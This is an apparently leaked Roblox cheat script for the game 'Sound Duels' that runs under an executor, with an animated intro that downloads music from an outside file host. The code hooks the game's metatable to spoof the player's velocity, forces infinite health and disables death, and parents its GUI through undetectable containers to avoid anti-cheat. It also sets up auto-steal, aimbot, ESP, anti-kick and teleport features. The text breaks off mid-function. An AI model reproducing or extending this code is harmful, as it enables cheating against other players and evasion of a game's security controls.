
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local TS_G = game:GetService("TweenService")
local LP = Players.LocalPlayer

local INTRO_MUSIC_URL = "https://files.catbox.moe/y4q5y3.mp3"
local INTRO_MUSIC_FILE = "cleanhub_intro_song_14.mp3"
local INTRO_MUSIC_VOLUME = 1
local FALLBACK_MUSIC_ID = "rbxassetid://9046862121"
local CHARACTER_ASSET_ID = "92554477662878"

local v76 = {
    [1]=12, [6]=32, [10]=0.15, [13]=0.4, [14]=6, [20]=3,
    [26]=255, [31]=5, [37]=22, [52]=100, [58]=1, [72]=60,
    [89]=2, [94]="Frame", [95]=4, [100]=10, [104]=false,
    [150]="TextButton", [164]=0.5, [168]=1, [175]=0, [187]=6, [198]=true,
}

_G._SoundIntroFinished = false
_G._VantaSkipIntro = false
_G._VantaIntroActive = true

local function resolveIntroMusicId()
    local assetGetter = getcustomasset or getsynasset
    if type(assetGetter) == "function" and type(writefile) == "function" then
        local exists = false
        if type(isfile) == "function" then
            pcall(function() exists = isfile(INTRO_MUSIC_FILE) end)
        end
        if not exists then
            local ok, data = pcall(function() return game:HttpGet(INTRO_MUSIC_URL) end)
            if ok and type(data) == "string" and #data > 0 then
                pcall(writefile, INTRO_MUSIC_FILE, data)
            end
        end
        local ok, asset = pcall(assetGetter, INTRO_MUSIC_FILE)
        if ok and asset then return asset end
    end
    return FALLBACK_MUSIC_ID
end

local function showIntro(onFinished)
    local introSound
    local function stopIntroMusic()
        if introSound then
            pcall(function() introSound:Stop() end)
            pcall(function() introSound:Destroy() end)
            introSound = nil
        end
    end

    if _G._VantaLoadIntroCleanup then pcall(_G._VantaLoadIntroCleanup) end
    local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
    local playerGui = LP:WaitForChild("PlayerGui")
    local old = playerGui:FindFirstChild("VantaLoadIntro")
    if old then old:Destroy() end
    local oldBlur = Lighting:FindFirstChild("VantaLoadIntroBlur")
    if oldBlur then oldBlur:Destroy() end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "VantaLoadIntro"
    screenGui.ResetOnSpawn = v76[104]
    screenGui.DisplayOrder = 1000005
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = playerGui

    introSound = Instance.new("Sound")
    introSound.Name = "VantaIntroMusic"
    introSound.SoundId = resolveIntroMusicId()
    introSound.Volume = INTRO_MUSIC_VOLUME
    introSound.Looped = false
    introSound.Parent = SoundService
    pcall(function() introSound:Play() end)

    local instance = Instance.new("Frame")
    instance.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
    instance.BackgroundTransparency = 1
    instance.BorderSizePixel = 0
    instance.Size = UDim2.fromScale(1, 1)
    instance.ZIndex = 1000
    instance.Parent = screenGui

    local rainContainer = Instance.new("Frame")
    rainContainer.Name = "PurpleRain"
    rainContainer.BackgroundTransparency = 1
    rainContainer.Size = UDim2.fromScale(1, 1)
    rainContainer.ZIndex = 1001
    rainContainer.ClipsDescendants = true
    rainContainer.Parent = instance

    local flag20 = true
    local flag21 = false
    task.spawn(function()
        while flag20 and not flag21 do
            local drop = Instance.new("Frame")
            drop.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
            drop.BackgroundTransparency = math.random(40, 70) / 100
            drop.BorderSizePixel = 0
            drop.Size = UDim2.fromOffset(math.random(1, 3), math.random(15, 30))
            drop.Position = UDim2.fromScale(math.random(0, 100) / 100, -0.1)
            drop.ZIndex = 1001
            drop.Parent = rainContainer
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(1, 0)
            corner.Parent = drop
            local fallTime = math.random(15, 25) / 10
            local tween = TS_G:Create(drop, TweenInfo.new(fallTime, Enum.EasingStyle.Linear), {
                Position = UDim2.fromScale(drop.Position.X.Scale, 1.1)
            })
            tween:Play()
            task.delay(fallTime + 0.1, function()
                if drop and drop.Parent then drop:Destroy() end
            end)
            task.wait(math.random(2, 6) / 100)
        end
    end)

    local characterFrame = Instance.new("Frame")
    characterFrame.Name = "CharacterContainer"
    characterFrame.BackgroundTransparency = 1
    characterFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    characterFrame.Position = UDim2.fromScale(0.5, 1.5)
    characterFrame.Size = isMobile and UDim2.fromOffset(250, 250) or UDim2.fromOffset(450, 450)
    characterFrame.ZIndex = 1005
    characterFrame.Parent = instance

    local characterImg = Instance.new("ImageLabel")
    characterImg.BackgroundTransparency = 1
    characterImg.Size = UDim2.fromScale(1, 1)
    characterImg.Image = "rbxassetid://" .. CHARACTER_ASSET_ID
    characterImg.ScaleType = Enum.ScaleType.Fit
    characterImg.ZIndex = 1006
    characterImg.Parent = characterFrame

    task.delay(0.2, function()
        if not flag20 then return end
        TS_G:Create(characterFrame, TweenInfo.new(1.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            Position = UDim2.fromScale(0.5, 0.45)
        }):Play()
        task.spawn(function()
            local direction = -1
            while flag20 and not flag21 do
                TS_G:Create(characterFrame, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                    Position = UDim2.fromScale(0.5, 0.45 + direction * 0.015)
                }):Play()
                direction = -direction
                task.wait(1.2)
            end
        end)
    end)

    local frame2 = Instance.new("Frame")
    frame2.Name = "VantaWordmark"
    frame2.BackgroundTransparency = 1
    frame2.BorderSizePixel = 0
    frame2.AnchorPoint = Vector2.new(0.5, 0.5)
    frame2.Position = UDim2.fromScale(0.5, 0.43)
    frame2.Size = isMobile and UDim2.fromOffset(240, 75) or UDim2.fromOffset(570, 160)
    frame2.ClipsDescendants = false
    frame2.ZIndex = 1003
    frame2.Parent = instance
    local uiScale = Instance.new("UIScale")
    uiScale.Scale = 0.86
    uiScale.Parent = frame2

    local tbl25 = {
        { id = 122032214221892, from = Vector2.new(-0.4, 0.2), final = Vector2.new(0.08, 0.5), rotation = -32, delay = 0.52 },
        { id = 122800305096107, from = Vector2.new(0.3, -0.55), final = Vector2.new(0.245, 0.5), rotation = 20, delay = 0.62 },
        { id = 88122827689967, from = Vector2.new(1.42, 0.3), final = Vector2.new(0.41, 0.5), rotation = -22, delay = 0.72 },
        { id = 88857087413344, from = Vector2.new(0.68, 1.55), final = Vector2.new(0.575, 0.5), rotation = 27, delay = 0.82 },
        { id = 110589136602702, from = Vector2.new(1.48, -0.42), final = Vector2.new(0.74, 0.5), rotation = 18, delay = 0.92 },
        { id = 110589136602702, from = Vector2.new(-0.35, 1.35), final = Vector2.new(0.905, 0.5), rotation = -14, delay = 1.02 },
    }
    local tbl31 = {}
    for i, spec in ipairs(tbl25) do
        local slot = Instance.new("Frame")
        slot.BackgroundTransparency = 1
        slot.BorderSizePixel = 0
        slot.AnchorPoint = Vector2.new(0.5, 0.5)
        slot.Position = UDim2.fromScale(spec.from.X, spec.from.Y)
        slot.Size = UDim2.fromScale(0.10, 0.70)
        slot.Rotation = spec.rotation
        slot.ZIndex = 1003 + i
        slot.Parent = frame2
        local img = Instance.new("ImageLabel")
        img.BackgroundTransparency = 1
        img.BorderSizePixel = 0
        img.Image = "rbxassetid://" .. tostring(spec.id)
        img.ImageColor3 = Color3.fromRGB(255, 255, 255)
        img.ImageTransparency = 1
        img.ScaleType = Enum.ScaleType.Fit
        img.AnchorPoint = Vector2.new(0.5, 0.5)
        img.Position = UDim2.fromScale(0.5, 0.5)
        img.Size = UDim2.fromScale(0.85, 0.85)
        img.ZIndex = 1004 + i
        img.Parent = slot
        local imgCorner = Instance.new("UICorner")
        imgCorner.CornerRadius = UDim.new(0, 6)
        imgCorner.Parent = img
        tbl31[i] = { slot = slot, image = img, spec = spec }
    end

    local textLabel = Instance.new("TextLabel")
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "TAP ANYWHERE TO SKIP"
    textLabel.TextColor3 = Color3.fromRGB(240, 240, 244)
    textLabel.TextTransparency = 1
    textLabel.TextSize = isMobile and 11 or 22
    textLabel.Font = Enum.Font.GothamMedium
    textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    textLabel.Position = UDim2.new(0.5, 0, 0.85, 0)
    textLabel.Size = UDim2.new(0.8, 0, 0, 24)
    textLabel.ZIndex = 1010
    textLabel.Parent = instance

    local textLabel2 = Instance.new("TextLabel")
    textLabel2.BackgroundTransparency = 1
    textLabel2.Text = "Discord.gg/soundhubb"
    textLabel2.TextColor3 = Color3.fromRGB(166, 168, 178)
    textLabel2.TextTransparency = 1
    textLabel2.TextSize = isMobile and 10 or 16
    textLabel2.Font = Enum.Font.GothamMedium
    textLabel2.AnchorPoint = Vector2.new(0.5, 0.5)
    textLabel2.Position = UDim2.new(0.5, 0, 0.88, 0)
    textLabel2.Size = UDim2.new(0.8, 0, 0, 22)
    textLabel2.ZIndex = 1010
    textLabel2.Parent = instance

    local skipBtn = Instance.new("TextButton")
    skipBtn.BackgroundTransparency = 1
    skipBtn.Text = ""
    skipBtn.AutoButtonColor = false
    skipBtn.Size = UDim2.fromScale(1, 1)
    skipBtn.ZIndex = 1011
    skipBtn.Parent = instance

    local blurEffect = Instance.new("BlurEffect")
    blurEffect.Name = "VantaLoadIntroBlur"
    blurEffect.Size = 0
    blurEffect.Parent = Lighting
    local canSkip = false

    local function smoothstep(a)
        local n = math.clamp(a, 0, 1)
        return n * n * (3 - 2 * n)
    end
    local function bezier(p0, p1, p2, t)
        local n = 1 - t
        return Vector2.new(n*n*p0.X + 2*n*t*p1.X + t*t*p2.X, n*n*p0.Y + 2*n*t*p1.Y + t*t*p2.Y)
    end

    local function closeIntro()
        if flag21 or not canSkip then return end
        flag21 = true
        flag20 = false
        stopIntroMusic()
        local ti = TweenInfo.new(0.42, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TS_G:Create(instance, ti, { BackgroundTransparency = 1 }):Play()
        TS_G:Create(uiScale, ti, { Scale = 0.72 }):Play()
        TS_G:Create(characterFrame, ti, { Position = UDim2.fromScale(0.5, 1.5) }):Play()
        TS_G:Create(blurEffect, ti, { Size = 0 }):Play()
        TS_G:Create(textLabel, ti, { TextTransparency = 1 }):Play()
        TS_G:Create(textLabel2, ti, { TextTransparency = 1 }):Play()
        for _, item in ipairs(tbl31) do TS_G:Create(item.image, ti, { ImageTransparency = 1 }):Play() end
        task.delay(0.42, function()
            if screenGui.Parent then screenGui:Destroy() end
            if blurEffect.Parent then blurEffect:Destroy() end
            _G._VantaLoadIntroCleanup = nil
            _G._VantaIntroActive = false
            if onFinished then onFinished() end
        end)
    end

    _G._VantaLoadIntroCleanup = function()
        flag20 = false
        flag21 = true
        stopIntroMusic()
        if screenGui.Parent then screenGui:Destroy() end
        if blurEffect.Parent then blurEffect:Destroy() end
    end
    skipBtn.Activated:Connect(closeIntro)

    TS_G:Create(instance, TweenInfo.new(0.25), { BackgroundTransparency = 0.5 }):Play()
    TS_G:Create(blurEffect, TweenInfo.new(0.25), { Size = 10 }):Play()
    task.delay(1.5, function()
        if not flag20 then return end
        TS_G:Create(textLabel, TweenInfo.new(0.3), { TextTransparency = 0.22 }):Play()
        TS_G:Create(textLabel2, TweenInfo.new(0.3), { TextTransparency = 0.18 }):Play()
        task.delay(0.5, function() canSkip = true end)
    end)

    task.spawn(function()
        local now = os.clock()
        while flag20 and not flag21 do
            local animTime = os.clock() - now - 0.5
            if animTime > 0 then
                local v = smoothstep((animTime - 0.38) / 0.9)
                local s1 = math.sin(animTime * 1.62) * v
                local s2 = math.sin(animTime * 3.24) * v
                uiScale.Scale = 0.86 + smoothstep(animTime / 0.78) * 0.14 + s1 * 0.012
                for i, item in ipairs(tbl31) do
                    local spec = item.spec
                    local offset = i - 3
                    local distance = math.abs(offset) / 2
                    local progress = math.clamp((animTime - spec.delay) / 0.96, 0, 1)
                    local eased = 1 - (1 - progress)^3
                    local pos = bezier(spec.from, Vector2.new((spec.from.X + spec.final.X) * 0.5 - offset * 0.08, (spec.from.Y + spec.final.Y) * 0.5 + ((i % 2 == 0) and -0.23 or 0.23)), spec.final, eased)
                    item.slot.Position = UDim2.fromScale(pos.X + offset * s1 * 0.009, pos.Y + (distance*distance*12 - 6) * s1 / 230 + s2 * (1 - distance) * 2.4 / 230)
                    item.slot.Size = UDim2.fromScale(0.15 * (1 + s1 * (0.035 + distance*0.055)), 0.65 - s1 * (0.028 + distance*0.045))
                    item.slot.Rotation = spec.rotation * (1 - eased) + offset * s1 * 5.8 + s2 * (1 - distance) * 0.8
                    local a = math.sin(animTime * 2.85 + i * 0.82)
                    local b = math.sin(animTime * 2.1 + i * 0.64)
                    item.image.Position = UDim2.new(0.5, 0, 0.5, b * 1.35)
                    item.image.Size = UDim2.fromScale(1 + a * 0.026, 1 - a * 0.038)
                    item.image.Rotation = b * 0.9
                    item.image.ImageTransparency = 1 - smoothstep((progress - 0.02) / 0.18)
                end
            end
            RunService.RenderStepped:Wait()
        end
    end)

    task.delay(10, function()
        if flag20 and not flag21 then
            canSkip = true
            closeIntro()
        end
    end)
end

showIntro(function()
    _G._SoundIntroFinished = true
    print("[Sound] Intro finished — loading main script...")
end)

repeat task.wait() until _G._SoundIntroFinished == true

--==================================================
-- SCRIPT PRINCIPAL SOUND DUELS (démarre après l'intro)
--==================================================

-- ============================================================
-- ANTI DROP + ANTI DIE (otomatis aktif setiap execute, tanpa toggle/GUI)
-- Diletakkan di paling atas agar aktif sebelum fitur lain jalan
-- ============================================================
-- ANTI DROP (spoof velocity HumanoidRootPart milik sendiri)
pcall(function()
    local Players = game:GetService("Players")
    local LP = Players.LocalPlayer
    local genv = (getgenv and getgenv()) or _G
    if genv.__ANTIDROP_ACTIVE then return end

    local mt = getrawmetatable(game)
    if not mt then return end

    local oldIdx = mt.__index
    local oldNewIdx = mt.__newindex
    local spoofedVelocity = Vector3.zero

    local function isMyRoot(self, key)
        return not checkcaller()
            and (key == "AssemblyLinearVelocity" or key == "Velocity")
            and typeof(self) == "Instance"
            and self:IsA("BasePart")
            and self.Name == "HumanoidRootPart"
            and LP.Character ~= nil
            and self:IsDescendantOf(LP.Character)
    end

    setreadonly(mt, false)
    mt.__index = newcclosure(function(self, key)
        if isMyRoot(self, key) then
            return spoofedVelocity
        end
        return oldIdx(self, key)
    end)
    mt.__newindex = newcclosure(function(self, key, value)
        if isMyRoot(self, key) then
            spoofedVelocity = value
            return
        end
        return oldNewIdx(self, key, value)
    end)
    setreadonly(mt, true)

    genv.__ANTIDROP_ACTIVE = true
end)

-- ANTI DIE (vida tak terbatas, state Dead dimatikan) - selalu aktif
pcall(function()
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LP = Players.LocalPlayer
    local genv = (getgenv and getgenv()) or _G

    -- bersihkan koneksi dari execute sebelumnya
    if genv.__ALWAYS_ANTIDIE_CONNS then
        for _, c in ipairs(genv.__ALWAYS_ANTIDIE_CONNS) do pcall(function() c:Disconnect() end) end
    end
    local conns = {}
    genv.__ALWAYS_ANTIDIE_CONNS = conns

    local function protect(char)
        if not char then return end
        local hum = char:WaitForChild("Humanoid", 5)
        if not hum then return end
        pcall(function()
            hum.MaxHealth = math.huge
            hum.Health = math.huge
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
        end)
        table.insert(conns, hum.StateChanged:Connect(function(_, new)
            if new == Enum.HumanoidStateType.Dead then
                pcall(function()
                    hum.Health = math.huge
                    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
                end)
            end
        end))
        table.insert(conns, hum:GetPropertyChangedSignal("Health"):Connect(function()
            if hum.Health < hum.MaxHealth then
                pcall(function() hum.Health = math.huge end)
            end
        end))
    end

    -- penjaga tambahan tiap frame (juga membetulkan kalau fitur lain mematikannya)
    table.insert(conns, RunService.Heartbeat:Connect(function()
        local char = LP.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum and hum.Parent then
            if hum.MaxHealth ~= math.huge then pcall(function() hum.MaxHealth = math.huge end) end
            if hum.Health < hum.MaxHealth then pcall(function() hum.Health = math.huge end) end
            pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false) end)
        end
    end))

    table.insert(conns, LP.CharacterAdded:Connect(function(c)
        task.wait(0.1)
        protect(c)
    end))
    task.spawn(function() protect(LP.Character) end)
end)

Players = game:GetService("Players")
UserInputService = game:GetService("UserInputService")
TweenService = game:GetService("TweenService")
RunService = game:GetService("RunService")
HttpService = game:GetService("HttpService")
Lighting = game:GetService("Lighting")
Workspace = game:GetService("Workspace")
Stats = game:GetService("Stats")
MaterialService = game:GetService("MaterialService")
ReplicatedStorage = game:GetService("ReplicatedStorage")
SoundService = game:GetService("SoundService")
StarterGui = game:GetService("StarterGui")
CoreGui = game:GetService("CoreGui")


_syn = rawget((getgenv and getgenv()) or _G, "syn") or rawget(_G, "syn")

if type(protectgui) ~= "function" and _syn and type(_syn.protect_gui) == "function" then
    protectgui = _syn.protect_gui
end

if type(getcustomasset) ~= "function" then
    if type(getexecutorasset) == "function" then
        getcustomasset = getexecutorasset
    elseif type(getsynasset) == "function" then
        getcustomasset = getsynasset
    elseif _syn and type(_syn.getcustomasset) == "function" then
        getcustomasset = _syn.getcustomasset
    elseif _syn and type(_syn.getsynasset) == "function" then
        getcustomasset = _syn.getsynasset
    end
end

--Leaked By Xlu0 AndPrime--
if type(isfile) ~= "function" and _syn and type(_syn.isfile) == "function" then isfile = _syn.isfile end
if type(readfile) ~= "function" and _syn and type(_syn.readfile) == "function" then readfile = _syn.readfile end
if type(writefile) ~= "function" and _syn and type(_syn.writefile) == "function" then writefile = _syn.writefile end
if type(delfile) ~= "function" and _syn and type(_syn.delfile) == "function" then delfile = _syn.delfile end

--Leaked By Xlu0 AndPrime--
if type(getconnections) ~= "function" then
    if type(get_signal_cons) == "function" then
        getconnections = get_signal_cons
    elseif type(getconnects) == "function" then
        getconnections = getconnects
    elseif _syn and type(_syn.get_signal_cons) == "function" then
        getconnections = _syn.get_signal_cons
    end
end

--Leaked By Xlu0 AndPrime--
function _xluCompatGuiParent()
    if type(gethui) == "function" then
        local ok, parent = pcall(gethui)
        if ok and parent then return parent end
    end
    local okCore, core = pcall(function() return CoreGui end)
    if okCore and core then return core end
    return nil
end

LP = Players.LocalPlayer
PlayerGui = LP:WaitForChild("PlayerGui")
--Leaked By Xlu0 AndPrime--
function getUndetectedGuiParent()
    --Leaked By Xlu0 AndPrime--
    if type(gethui) == "function" then
        local ok, parent = pcall(gethui)
        if ok and parent then return parent end
    end
    --Leaked By Xlu0 AndPrime--
    if protectgui then
        return game:GetService("CoreGui")
    end
    --Leaked By Xlu0 AndPrime--
    local cg = game:GetService("CoreGui")
    if cg then return cg end
    --Leaked By Xlu0 AndPrime--
    return PlayerGui
end

function safeParentGui(gui)
    pcall(function()
        if type(gethui) == "function" then
            local ok, parent = pcall(gethui)
            if ok and parent then
                gui.Parent = parent
                return
            end
        end
        if protectgui then
            gui.Parent = game:GetService("CoreGui")
            pcall(function() protectgui(gui) end)
            return
        end
        gui.Parent = game:GetService("CoreGui")
    end)
    --Leaked By Xlu0 AndPrime--
    if not gui.Parent then
        pcall(function() gui.Parent = PlayerGui end)
    end
end



SoundAutoMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
_G.SoundIsMobile = SoundAutoMobile
_G.SoundDeviceMode = SoundAutoMobile and "MOBILE" or "PC"

for _, name in ipairs({"SoundDuelsSoundReconstruct", "SoundHubPolished", "CyberHub"}) do
old = PlayerGui:FindFirstChild(name)
if old then old:Destroy() end
end
NS = 60
CS = 30
LAGGER_SPEED = 15
LAGGER_CARRY_SPEED = 24.5
currentSpeedMode = "Normal"
speedBoosterEnabled = true
carrySpeedActive = false
laggerModeEnabled = false
laggerCarryActive = false
autoCarrySpeedEnabled = false
setAutoCarrySpeedVisual = nil
_G.SoundAutoCarryWasCarrying = false
_G.SoundAutoCarrySavedMode = nil
autoStealEnabled = false
selectedStealMode = "Auto Steal V3"
autoStealRadius = 63
_G.SoundStealRadii = _G.SoundStealRadii or {["Auto Steal V3"] = 63, Semi = 9}
_G.SoundStealRadii["Auto Steal V3"] = tonumber(_G.SoundStealRadii["Auto Steal V3"] or _G.SoundStealRadii.Normal) or 63
autoStealRadiusBox = nil
selectedAimbotMode = "Normal"
AIMBOT_SPEED = 58
-- ==================== BAT V2 GLOBALS ====================
antiBatBypassEnabled = false
BAT_V2_SPEED = AIMBOT_SPEED or 58

_G.AceAntiBypassAimbot = _G.AceAntiBypassAimbot or {
    conn = nil,
    swingCooldown = false,
    prevAutoRotate = nil,
}
_G.AceAntiBypassSlapList = _G.AceAntiBypassSlapList or {
    "Bat","Slap","Iron Slap","Gold Slap","Diamond Slap",
    "Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap",
    "Nuclear Slap","Galaxy Slap","Glitched Slap",
}
-- ========================================================
LAGGER_AIMBOT_SPEED = 40
_G.SoundAntiBypassAimbotSpeed = _G.SoundAntiBypassAimbotSpeed or 58
if _G.SoundAntiBypassLaggerAimbotSpeed == nil or tonumber(_G.SoundAntiBypassLaggerAimbotSpeed) == 58 then _G.SoundAntiBypassLaggerAimbotSpeed = 40 end
autoSwingEnabled = false
mirrorTPDownEnabled = false
_G.SoundNormalAimbotOn = _G.SoundNormalAimbotOn or false
_G.SoundAntiBypassAimbotOn = _G.SoundAntiBypassAimbotOn or false
antiDesyncAutoSwingEnabled = false
_G.SoundAntiDesyncAimbotOn = _G.SoundAntiDesyncAimbotOn or false
ANTI_DESYNC_AIMBOT_SPEED = 58
batCounterEnabled = false
medCounterEnabled = false
hardHitEnabled = false
hardHitRadius = 10
perfectHitEnabled = false
perfectHitRange = 175
_G.SoundPerfectHitEnabled = false
_G.SoundHardHitEnabled = false
_G.SoundHardHitRadius = 10
antiKickEnabled = false
setSafeModeVisual = nil
autoResetOnMedEnabled = false
espEnabled = false
espLineEnabled = false
showTracerEnabled = false
ragdollCountdownEnabled = true
fpsBoostEnabled = false
antiLagVisualEnabled = false
nukeOptimiserEnabled = false
fovEnabled = false
fovValue = 70
noCamCollisionEnabled = false
_G.SoundNoPlayerCollisionEnabled = _G.SoundNoPlayerCollisionEnabled or false
customFontVisualEnabled = false
_G.SoundCustomFontSelected = _G.SoundCustomFontSelected or "None"
skyTheme = "Night"
setPlayerESPVisual = nil
setESPLineVisual = nil
setTracerESPVisual = nil
setRagdollCountdownVisual = nil
setFPSBoostVisual = nil
setAntiLagVisual = nil
setNukeOptimiserVisual = nil
setFOVVisual = nil
setNoCamCollisionVisual = nil
_G.SoundSetNoPlayerCollisionVisual = _G.SoundSetNoPlayerCollisionVisual or nil
setCustomFontVisual = nil
skyValueLabel = nil
autoLeftEnabled = false
autoRightEnabled = false
DEFAULT_SPEED_KEYBINDS = {
SpeedToggle = Enum.KeyCode.Q,
LaggerToggle = Enum.KeyCode.R,
DropBrainrot = Enum.KeyCode.X,
Aimbot = Enum.KeyCode.E,
AutoLeft = Enum.KeyCode.Z,
AutoRight = Enum.KeyCode.C,
InstaReset = Enum.KeyCode.Unknown,
BatV2 = Enum.KeyCode.Unknown,
ToggleUI = Enum.KeyCode.LeftControl,
}
DEFAULT_TP_DOWN_KEYBIND = Enum.KeyCode.F
speedKeybinds = {
SpeedToggle = DEFAULT_SPEED_KEYBINDS.SpeedToggle,
LaggerToggle = DEFAULT_SPEED_KEYBINDS.LaggerToggle,
DropBrainrot = DEFAULT_SPEED_KEYBINDS.DropBrainrot,
Aimbot = DEFAULT_SPEED_KEYBINDS.Aimbot,
AutoLeft = DEFAULT_SPEED_KEYBINDS.AutoLeft,
AutoRight = DEFAULT_SPEED_KEYBINDS.AutoRight,
InstaReset = DEFAULT_SPEED_KEYBINDS.InstaReset,
BatV2 = DEFAULT_SPEED_KEYBINDS.BatV2,
ToggleUI = DEFAULT_SPEED_KEYBINDS.ToggleUI,
}
speedKeybindButtons = {}
listeningForSpeedKey = nil
autoTPEnabled = false
autoTPHeight = 20
autoTPConn = nil
autoTPLastRun = 0
autoTPClickDebounce = false
tpDownKeybind = Enum.KeyCode.F
tpDownKeybindButton = nil
listeningForTPDownKey = false
keybindListenStartedAt = 0
setAutoTPVisual = nil
function doAutoTPDown(force)
    local char = LP.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local hum2 = char:FindFirstChildOfClass("Humanoid")
    if not hum2 then return end
    if not force then
        if hum2.FloorMaterial ~= Enum.Material.Air then return end
        if not (hrp.Position.Y >= (tonumber(autoTPHeight) or 20)) then return end
    end
    local yaw = select(2, hrp.CFrame:ToEulerAnglesYXZ())
    hrp.CFrame = CFrame.new(hrp.Position.X, -7.00, hrp.Position.Z) * CFrame.Angles(0, yaw, 0)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
    pcall(function() hrp.Velocity = Vector3.zero end)
    pcall(function() hrp.RotVelocity = Vector3.zero end)
end
local function _clearAutoTPConnection()
if autoTPConn then
pcall(function() autoTPConn:Disconnect() end)
pcall(function() task.cancel(autoTPConn) end)
autoTPConn = nil
end
end
local function startAutoTP()
autoTPEnabled = true
_clearAutoTPConnection()
autoTPLastRun = 0
autoTPConn = RunService.Heartbeat:Connect(function()
if not autoTPEnabled then
_clearAutoTPConnection()
return
end
local now = tick()
if now - autoTPLastRun < 0.1 then return end
autoTPLastRun = now
pcall(function() doAutoTPDown(false) end)
end)
if setAutoTPVisual then setAutoTPVisual(true) end
end
local function stopAutoTP()
autoTPEnabled = false
_clearAutoTPConnection()
if setAutoTPVisual then setAutoTPVisual(false) end
end
local function runTPFloor()
pcall(function() doAutoTPDown(true) end)
end
local function toggleAutoTP(on)
if on then
startAutoTP()
else
stopAutoTP()
end
if saveSoundConfig then pcall(saveSoundConfig) end
end
function _G.SoundStopAutoTPForAction()
if autoTPEnabled then
stopAutoTP()
pcall(function() if setAutoTPVisual then setAutoTPVisual(false) end end)
if saveSoundConfig then pcall(saveSoundConfig) end
end
end
local dropBrainrotActive = false
local _adaptDropConns = {}

_G.SoundDropMode = (_G.SoundDropMode == "Jump Drop") and "Jump Drop" or "Stand Drop"

local _xDropLastInvoke = 0
local _xDropConn = nil
local function stopDropBrainrot()
    dropBrainrotActive = false
    if _xDropConn then
        pcall(function() _xDropConn:Disconnect() end)
        _xDropConn = nil
    end
    for _, t in ipairs(_adaptDropConns) do
        if type(t) == "thread" then pcall(task.cancel, t)
        elseif typeof(t) == "RBXScriptConnection" then pcall(function() t:Disconnect() end) end
    end
    _adaptDropConns = {}
    local c = LP.Character
    if c then
        local root = c:FindFirstChild("HumanoidRootPart")
        if root then
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end
    end
end

local function runStandDrop()
    if dropBrainrotActive then return end
    local now = tick()
    if now - _xDropLastInvoke < 0.2 then return end
    _xDropLastInvoke = now
    if _G.SoundStopAutoTPForAction then _G.SoundStopAutoTPForAction() end
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    dropBrainrotActive = true
    local startTime = tick()
    _xDropConn = RunService.Heartbeat:Connect(function()
        local currentChar = LP.Character
        local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
        if not currentChar or not currentRoot then
            stopDropBrainrot()
            return
        end
        if tick() - startTime >= (_G.SoundDropAscendDuration or 0.2) then
            if _xDropConn then pcall(function() _xDropConn:Disconnect() end); _xDropConn = nil end
            local rayParams = RaycastParams.new()
            rayParams.FilterDescendantsInstances = {currentChar}
            rayParams.FilterType = Enum.RaycastFilterType.Exclude
            local rayResult = workspace:Raycast(currentRoot.Position, Vector3.new(0, -2000, 0), rayParams)
            if rayResult then
                local hum = currentChar:FindFirstChildOfClass("Humanoid")
                local offset = (hum and hum.HipHeight or 2) + (currentRoot.Size.Y / 2)
                currentRoot.CFrame = CFrame.new(currentRoot.Position.X, rayResult.Position.Y + offset, currentRoot.Position.Z)
                    * CFrame.Angles(0, select(2, currentRoot.CFrame:ToEulerAnglesYXZ()), 0)
                currentRoot.AssemblyLinearVelocity = Vector3.zero
                currentRoot.AssemblyAngularVelocity = Vector3.zero
            end
            dropBrainrotActive = false
            return
        end
        local v = currentRoot.AssemblyLinearVelocity
        local up = tonumber(_G.SoundDropAscendSpeed) or 150
        pcall(function()
            currentRoot.AssemblyLinearVelocity = Vector3.new(v.X, up, v.Z)
        end)
    end)
    task.delay(1.0, function()
        if dropBrainrotActive then stopDropBrainrot() end
    end)
end

_G.SoundJumpDropActive = false
_G.SoundJumpDropAscendDuration = 0.2
_G.SoundJumpDropAscendSpeed = 150
_G.SoundDropAscendDuration = _G.SoundDropAscendDuration or 0.2
_G.SoundDropAscendSpeed    = _G.SoundDropAscendSpeed    or 150

function _G.SoundRunJumpDrop()
if _G.SoundJumpDropActive then return end
if _G.SoundStopAutoTPForAction then pcall(_G.SoundStopAutoTPForAction) end

local char = LP.Character
local root = char and char:FindFirstChild("HumanoidRootPart")
if not char or not root then return end

_G.SoundJumpDropActive = true
local startTime = tick()

_G.SoundJumpDropConn = RunService.Heartbeat:Connect(function()
local currentChar = LP.Character
local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")

if not currentChar or not currentRoot then
if _G.SoundJumpDropConn then
pcall(function() _G.SoundJumpDropConn:Disconnect() end)
_G.SoundJumpDropConn = nil
end
_G.SoundJumpDropActive = false
return
end

if tick() - startTime >= _G.SoundJumpDropAscendDuration then
if _G.SoundJumpDropConn then
pcall(function() _G.SoundJumpDropConn:Disconnect() end)
_G.SoundJumpDropConn = nil
end

local rayParams = RaycastParams.new()
rayParams.FilterDescendantsInstances = {currentChar}
rayParams.FilterType = Enum.RaycastFilterType.Exclude

